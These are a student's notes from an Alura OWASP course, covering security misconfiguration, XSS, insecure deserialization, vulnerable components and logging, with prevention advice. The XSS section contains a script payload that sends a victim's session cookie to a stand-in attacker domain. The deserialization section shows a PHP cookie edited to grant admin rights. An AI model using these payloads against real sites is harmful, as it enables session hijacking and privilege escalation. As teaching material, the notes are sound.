# Formaçao OWASP
iniciado em 03/02/2022

terminado em 06/02/2022

[certificate](https://cursos.alura.com.br/certificate/8c40d450-cca5-4628-b9f9-75364ea32cdc) 

Table of contents
- [Formaçao OWASP](#formaçao-owasp)
  - [OWASP](#owasp)
  - [OWASP Top 10: Security misconfiguration, logging e monitoramento](#owasp-top-10-security-misconfiguration-logging-e-monitoramento)
    - [security misconfiguration](#security-misconfiguration)
      - [example of attacks scenarios](#example-of-attacks-scenarios)
      - [como prevenir?](#como-prevenir)
      - [o que aprendemos?](#o-que-aprendemos)
    - [cross site scripting (XSS)](#cross-site-scripting-xss)
      - [example attack scenario](#example-attack-scenario)
      - [como prevenir?](#como-prevenir-1)
      - [o que aprendemos?](#o-que-aprendemos-1)
    - [insecure deserialization](#insecure-deserialization)
      - [is the application vulnerable?](#is-the-application-vulnerable)
      - [example attacks scenarios](#example-attacks-scenarios)
      - [como prevenir?](#como-prevenir-2)
      - [o que aprendemos?](#o-que-aprendemos-2)
    - [using components with known vulnerabilities](#using-components-with-known-vulnerabilities)
      - [exemplos e prevençao](#exemplos-e-prevençao)
      - [o que aprendemos?](#o-que-aprendemos-3)
    - [insufficient Logging and Monitoring](#insufficient-logging-and-monitoring)
      - [exemplos](#exemplos)
      - [como prevenir?](#como-prevenir-3)
      - [o que aprendemos?](#o-que-aprendemos-4)

## OWASP

aprenda a lidar com o top 10 dos maiores riscos de segurança em uma aplicaçao web e conheça o padrao de verificaçao de segurança de aplicações (parte 2).

[link](https://cursos.alura.com.br/formacao-owasp)

## OWASP Top 10: Security misconfiguration, logging e monitoramento

agora vamos falar sobre os riscos a partir do 6o colocado ate ao 10o.

vamos ver que é sempre vamos ter esses riscos nas nossas aplicaçoes e cada vez mais em aplicaçoes modernas.

e vamos ver tambem como previni-los com exemplos de tecnicas que nos podemos utilizar para garantir que eles nao voltem a nos aborrecer no futuro.

### security misconfiguration
entao, o 6o lugar é de má configuraçao de segurança.

the application might be vulnerable if the application is:
* missing appropriate security hardening across any part of the application stack, or improperly configured permissions on cloud services
* unnecessary features are enabled or installed (e.g. unecessary ports, services like mysql or ping support, mongoDB, etc, pages, accounts or privileges)
* default accounts (e.g. admin/admin) and their passwords still enabled and unchanged
* error handling reveals stack traces or other overly informative error messages to users (todo tratamento de erro deve esconder as informaçoes, somente o minimo de informaçoes)
* for upgraded systems, latest security features are disabled or not configured securely
* the security settings in the application servers, application frameworks (e.g. Struts, Spring, ASP.NET), libraries, databases, etc not set to secure values
* the server does not send security headers or directives or they are not set to secure values
* the software is out of date or vulnerable 

without a concerted, repeatable application security configuration process systems are at a higher risk.

o que significa que se tivermos sempre que fazer a config manualmente, podemos esquecer alguma coisa e assim ficar vulneravel.

#### example of attacks scenarios
* scenario 1

the application server comes with sample applications that are not removed from the production server.

these sample applications have know security flaws attackers use to compromise the server.

if one of these applications is the admin console and default accounts weren´t changed the attackers logs in with default passwords and takes over.

* scenario 2

directory listing is not disabled on the server. an attacker discovers they can simply list directories. the attacker finds and downloads the compiled java classes, which they decompile and reverse engineer to view the code. the attacker then finds a serious access control flaw in the application

* scenario 3

the application server´s configuration allows detailed error messages, e.g. stacktraces, to be returned to users. this potentially exposes sensitive information or underlying flaws such as component versions that are known to be vulnerable.

* scenario 4

a cloud service provider has default sharing permissions open to the internet by other CSP users. this allows sensitive data stored within cloud storage to be accessed.

#### como prevenir?
secure installation processes should be implemented, including:
* a repeatable hardening process that makes it fast and easy to deploy another enviroment that is properly locked down

development, QA and production enviroments should all be configured identically, with different credentials used in each enviroment. this process should be automated to minimize the efford required to setup a new secure enviroment.

* a minimal platform without any unnecessary features, components, documentation and samples. remove or do not install unused features and frameworks

* a task to review and update the configurations appropriate to all security notes, updates and patches as part ot the patch management process. in particular, review cloud storage permissions (e.g. S3 bucket permissions)

* a segmented application architecture that provides effective, secure separation between components or tenants, with segmentation, containerization or cloud security groups

* sending security directives to clients, e.g. security headers

* an automated process to verify the effectiveness of the configurations and settings in all enviroments.
  
#### o que aprendemos?
* problemas de configuraçao de segurança
* como preveni-los

### cross site scripting (XSS)
o cross site scripting envolve sites, em geral, multiplos sites e scripting entre os sites.

é um dos tipos de ataques que aparecem muito mesmo e algumas ferramentas vao ajudar a encontrar buracos automaticamente.

um exemplo envolve 2 sites, o nosso site e o site do atacante. 

embora estejamos falando de sites poderia ser um API tambem, ou quaisquer outros sistemas ou serviços, onde é interpretado codigo de forma dinamica para ser executado.

entao por exemplo o navegador, que é um sistema que carrega codigo dinamico de um site, por exemplo um site que tem um pagamento por cartao de credito.

is the application vulnerable?

there are three forms of XSS, usually targeting users browsers:

* refected XSS: the application of API includes unvalidated and unescaped user input as partof HTML output. a successfull attack can allow the attacker to execute arbitrary HTML and javascript in the victim´s browser. typically the user will need to interact with some malicious link that points to an attacker-controlled page, such as malicious watering hole websites, advertisements or similar.

* stored XSS: the application or API stores unsinitized user-input that is viewed at a later time by another user or an administrator. stored XSS is often considered a high or critical risk

* DOM XSS: javascript frameworks, single page applications and APIs that dinamically include attacker-controllable data to a page are vulnerable to DOM XSS. ideally, the application would not send attacker-controllable data to unsafe javascripts API.

typycall XSS attacls include session stealing, account takeover, MFA bypass, DOM node replacement or defacement (such as trojan login panels), attacks against the user´s browser such as mallicious software downloads, key loggin and other client-side attacks.

#### example attack scenario
* scenario 1: the application uses untrusted data in the construction of the following HTML snippet withou validation or scaping:

```
(String) page += "<input name='creditcard' type='TEXT' value='"+ request.getParameter("CC") + "'>;

```

the attacker modifies the 'CC' parameter in the browser to:

```
'><script>document.location='http://www.attackerxptoz.com/cgi-bin/cookie.cgi?foo='+document.cookie</script>
```

this attack causes the victim´s session ID to be sent to the attacker´s website, allowing the attacker to hijack the user´s current session.

```diff
- NOTE: attackers can use XSS to defeat any automated cross-site request forgery (CSRF) defense the application might employ
```

#### como prevenir?
preventing XSS requires separation of untrusted data from active browser content. this can be achieved by:
* using frameworks that automatically escapes XSS by design, such as the latest Ruby on Rails, React JS. Learn the limitations of each framework´s XSS protection and appropriately handle the use cases which are not covered.

* escaping untrusted HTTP request data based on the context in the HTML output (body, attribute, Javascript, CSS or URL) will resolve Reflected and Stored XSS vulnerabilities. the OWASP cheat sheet 'XSS Prevention' has details on the required data escaping techniques.

* applying context-sensitive encoding when modifying the browser document on the client side acts agaist DOM XSS. when this cannot be avoided, similar context sensitive escaping techniques can be applied to browser APIs as described in the 'OWASP Cheat Sheet 'DOM based XSS Prevention'

* enabling a 'Content Security Policy (CSP)' (https://developer.mozilla.org/pt-BR/docs/Web/HTTP/CSP) is a defense-in-depth mitigating control agais XSS. it is effective if no other vulnerabilities exists that would allow placing malicious code via local file includes (e.g. path traversal overwrites or vulnerable libraries from permitted content delivery networks)

#### o que aprendemos?
* o que é cross site scripting
* exemplos de vulnerabilidades
* exemplos de prevençoes

### insecure deserialization
para entender um ataque de desserializaçao, primeiro precisamos entender o que é a serializaçao.

serializaçao é quando voce transforma os dados em alguma sequencia, uma sequencia de bytes, uma sequencia de texto, ou uma sequencia de qualquer coisa.

e quando ocorre essa transformaçao?

em geral, quando voce esta enviando coisas na internet, usando por exemplo JSON ou XML.

#### is the application vulnerable?

applications and APIs will be vulnerable if they deserialize hostile or tampered objects supplied by an attacker.

this can result in two primary types of attacks:
* object and data stricture related attacks where the attacker modifies application logic or achieves arbitrary remote code execution if there are classes available to the application that can change behaviour during or after deserialization

* typical data tampering attacks, such as access-control-related attacks, where existing data strictures are used but the content is changed.

serialization may be used in applications for:
* remote- and inter-process comunications (RCP/IPC)
* wire protocols, web services, message brokers
* caching/persistence
* database, cache services, file systems
* HTTP cookies, HTML form parameters, API authentication tokens

#### example attacks scenarios
* scenario 1: a react application calls a set of Spring boot microservices. being functional programmers, they tried to ensure that their code is immutable. the solution they came up with is serializing user state and passing it back and forth with each request. an attacker notices the "R00" java object signature, and uses the Java Serial Killer tool to gain remote code execution on the application server

* scenario 2: a PHP forum uses PHP object serialization to sabe a "super" cookie, containing the user´s iser ID, role, password hash and other state:

```
a:4:{i:0;i:132;i:1;s:7:"Mallory";i:2;s:4:"user";i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}
```

an attacker changes the serialized object to give themselves admin privileges:

```
a:4:{i:0;i:132;i:1;s:7:"Alice";i:2;s:4:"admin";i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}
```

#### como prevenir?
the only safe architectural pattern is not to accept serialized objects from unstrusted sources or to use serialization mediums that only permit primitive data types.

if that is not possible, consider one of more of the following:
* implementing integrity checks such as digital signatures on any serialized objects to prevent hostile object creation or data tampering
* enforcing strict type constraints during deserialization before object creation as the code typically expects a definable set of classes. 

```diff  
- bypasses to this technique have been demonstrated, so reliance solely on this is not advisable.
```
* isolating and runnig code that deserializes in low privilege enviroments when possible
* loggin deserialization exceptions and failures, such as where the incoming type is not the expected type or the deserialization throws exceptions
* restrict or monitoring incoming and outgoing network connectivity from containers or server that deserialize
* monitoring deserialization, alerting if a user deserializes constantly.

#### o que aprendemos?
* o que é insecure deserialization
* exemplos de vulnerabilidades
* exemplos de prevençoes

### using components with known vulnerabilities
is the application vulnerable?

you ara likely vulnerable:
* if you not know the versions of all components you use (both client-side and server-side). this includes components you directly use as well as nested dependencies.

* if software is vulnerable, unsuported, or out-of-date. this includes the OS, web/application server, database management system (DBMS), applications, APIs and all components, runtime enviroments and libraries.

* if you do no scan for vulnerabilities regurlaly and subscrive to security bulletins related to the components you use.

* if you do not fix or upgrade the underlying platform, frameworks, and dependencies in a risk-based, timely fashion. This commonly happens in enviroments when patching is a montly or quartely task under change control, which leaves organizations open to many days or months of unnecessary exposere to fixed vulnerabilities.

* if software developers do not test the compatibility of updated, upgraded, or patched libraries.

* if you do not secure the components´ configurations (see security misconfiguration)

#### exemplos e prevençao
Example attack scenarios:
* Scenario 1: components typically run with the same privileges as the application itself, so flaws in any component can result in serious impact. such flaws can be accidental (e.g. coding error) or intentional (e.g. backdoor in component). some example exploitable component vulnerabilities discovered are:
  * CVE-2017-5638, a Struts 2 remote code execution vulnerability that enables execution of arbitrary code on the server, has been blamed for significant breaches.
  * while internet of things (IoT) are frequently difficult or impossible to patch, the importance of patching them can be great (e.g. biomedical devices)

* there are automated tools to help attackers find unpatched or misconfigured systems. for example, the shodan IoT search engine can help you find devices that still suffer from the Heartbleed vulnerability that was patched in april 2014.

how to prevent?
there should be a patch management process in place to:
* remove unused dependencies, unnecessary features, components, files and documentation.
* continuously inventory the versions of both client-side and server-side components (e.g. frameworks, libraries) and their dependencies using tools like verions, DependencyCheck, retire.js, etc. continously monitor sources like CVE and NVD for vulnerabilities in the components. use software compositions analysis tools to automate the process. subscribe to email alerts for security vulnerabilities related to components you use.
* only obtain components from official sources over secure links. prefer signed packages to reduce the chance of including a modified, malicious component.
* monitor for libraries and components that are unmaintained or do not create security patches for older versions. if patching is not possible, consider deploying a virtual patch to monitor, detect or protect against the discovered issue.

every organization must ensure that there is an ongoing plan for monitoring, triaging and applying updates or configuration changes for the lifetime of the application or portfolio.

#### o que aprendemos?
* o que é Using Components With Known Vulnerabilities
* exemplos de vulnerabilidades
* exemplos de prevençoes

### insufficient Logging and Monitoring
is the application vulnerable?
insufficient logging, detection, monitoring and active response occurs any time:
* auditable events, such as logins, failed logins, and high-value transactions are not logged.
* warnings and erros generate no, inadequate, or unclear log messages
* logs of applications and APIs are not monitored for suspicious activity
* logs are only stored locally
* appropriate alerting thresholdsand response escalation processes are not in place or effective
* penetration testing and scans by DAST tools (such as OWASP ZAP) do not trigger alerts
* the application is unable to detect, escalate or alert for active attacks in real time or near real time

you are vulnerable to information leakage if you make logging and alerting events visible to a user or an attacker (see sensitive information exposure)

#### exemplos
Example Attack Scenarios:
* Scenario 1: an open source project forum software run by a small team was hacked using a flaw in its software. the attackers managed to wipe out the internal source code repository containing the next version, and all of the forum contents. although source could be recovered, the lack of monitoring, logging or alerting led to a far worse breach. the forum software project is no longer active as a result of this issue.
* Scenario 2: an attacker uses scans for users using a common password. they can take over all accounts using this password. for all other users, this scan leaves only one false login behind. after some days, this may be repeated with a different password
* Scenario 3: a major US retailer reportedly had an internal malware analysis sandbox analysing attachments. the sandbox software had detected potentially unwanted software but no one responded to this detection. the sandbox hab been producing warnings for some time before the breach was detected due to fraudulent card transactions by an external bank.

#### como prevenir?
how to prevent?
as per the risk of the data stored or processed by the application:
* ensure all login, access control failures, and server-side input validation failures can be logged with sufficient user context to identify suspicious or malicious accounts, and held for sufficient time to allow delayed forensic analysis.
* ensure that logs are generated in a format that can be easily consumed by a centralized log management solutions
* ensure high value transactions have an audit trail with integrity controls to prevent tampering or deletion, such as append-only database tables or similar
* establish effective monitoring and alerting such that suspicious activities are detected and responded to in a timely fashion
* establish or adopt an incident response and recovery plan, such as NIST 800-61 rev 2 or later

there are commercial and open source application protection frameworks such as OWASP AppSensor, web application firewalls such as ModSecurity with the OWASP ModSecurity Core Rule Set, and log correlation software with custom dashboard and alerting.

#### o que aprendemos?
* o que é insufficient Logging and Monitoring
* exemplos de vulnerabilidades
* exemplos de prevençoes

